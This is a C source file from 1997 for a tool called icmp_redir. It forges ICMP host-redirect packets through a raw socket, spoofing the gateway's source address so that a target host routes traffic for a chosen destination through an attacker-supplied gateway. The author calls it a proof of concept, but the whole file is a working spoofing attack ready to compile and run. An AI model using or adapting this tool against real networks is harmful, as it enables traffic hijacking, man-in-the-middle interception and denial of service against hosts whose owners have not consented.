 /* icmp_redir.c

    This program sends out an  ICMP host redirect packet with  gateway
    IP supplied by user.  It was written and tested under Linux 2.0.30
    and could be rather easily modified to work on most Unices.

    The idea  behind this  program is  a proof  of a  concept, nothing
    more.  It comes  as is, no warranty.   However, you're allowed  to
    use  it   under  one   condition:   you   must  use   your   brain
    simultaneously.  If  this condition is  not met, you  shall forget
    about this program and go RTFM immediately.

    yuri volobuev'97
    volobuev@t1.chem.umn.edu

    */
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <errno.h>
    #include <unistd.h>
    #include <netdb.h>
    #include <syslog.h>
    #include <sys/socket.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netinet/ip_icmp.h>
    #include <netinet/ip.h>

    #define IPVERSION       4

    struct raw_pkt {
	    struct iphdr ip; /* This is Linux-style iphdr.
				Use BSD-style struct ip if you want */
	    struct icmphdr icmp;
	    struct iphdr encl_iphdr;
	    char encl_ip_data[8];
    };

    struct raw_pkt* pkt;

    void die(char *);
    unsigned long int get_ip_addr(char*);
    unsigned short checksum(unsigned short*,char);

    int main(int argc,char** argv){

    struct sockaddr_in sa;
    int sock,packet_len;
    char usage[]={"icmp_redir: send out custom ICMP host redirect packet.  \
    yuri volobuev'97\n\
    usage: icmp_redir gw_host targ_host dst_host dummy_host\n"};
    char on = 1;

    if(argc != 5)die(usage);

    if( (sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0){
	    perror("socket");
	    exit(1);
	    }

    sa.sin_addr.s_addr = get_ip_addr(argv[2]);
    sa.sin_family = AF_INET;

    packet_len = sizeof(struct raw_pkt);
    pkt = calloc((size_t)1,(size_t)packet_len);

    pkt->ip.version = IPVERSION;
    pkt->ip.ihl = sizeof(struct iphdr) >> 2;
    pkt->ip.tos = 0;
    pkt->ip.tot_len = htons(packet_len);
    pkt->ip.id = htons(getpid() & 0xFFFF);
    pkt->ip.frag_off = 0;
    pkt->ip.ttl = 0x40;
    pkt->ip.protocol = IPPROTO_ICMP;
    pkt->ip.check = 0;
    pkt->ip.saddr = get_ip_addr(argv[1]);
    pkt->ip.daddr = sa.sin_addr.s_addr;
    pkt->ip.check = checksum((unsigned short*)pkt,sizeof(struct iphdr));

    pkt->icmp.type = ICMP_REDIRECT;
    pkt->icmp.code = ICMP_REDIR_HOST;
    pkt->icmp.checksum = 0;
    pkt->icmp.un.gateway = get_ip_addr(argv[4]);

    memcpy(&(pkt->encl_iphdr),pkt,sizeof(struct iphdr));
    pkt->encl_iphdr.protocol = IPPROTO_IP;
    pkt->encl_iphdr.saddr = get_ip_addr(argv[2]);
    pkt->encl_iphdr.daddr = get_ip_addr(argv[3]);
    pkt->encl_iphdr.check = 0;
    pkt->encl_iphdr.check = checksum((unsigned short*)&(pkt->encl_iphdr),
	    sizeof(struct iphdr));

    pkt->icmp.checksum = checksum((unsigned short*)&(pkt->icmp),
	    sizeof(struct raw_pkt)-sizeof(struct iphdr));

    if (setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char *)&on,sizeof(on)) < 0) {
	    perror("setsockopt: IP_HDRINCL");
	    exit(1);
	    }

    if(sendto(sock,pkt,packet_len,0,(struct sockaddr*)&sa,sizeof(sa)) < 0){
	    perror("sendto");
	    exit(1);
	    }
    exit(0);
    }

    void die(char* str){
    fprintf(stderr,"%s\n",str);
    exit(1);
    }

    unsigned long int get_ip_addr(char* str){

    struct hostent *hostp;
    unsigned long int addr;

    if( (addr = inet_addr(str)) == -1){
	    if( (hostp = gethostbyname(str)))
		    return *(unsigned long int*)(hostp->h_addr);
	    else {
		    fprintf(stderr,"unknown host %s\n",str);
		    exit(1);
		    }
	    }
    return addr;
    }

    unsigned short checksum(unsigned short* addr,char len){
    register long sum = 0;

    while(len > 1){
	    sum += *addr++;
	    len -= 2;
	    }
    if(len > 0) sum += *addr;
    while (sum>>16) sum = (sum & 0xffff) + (sum >> 16);

    return ~sum;
    }

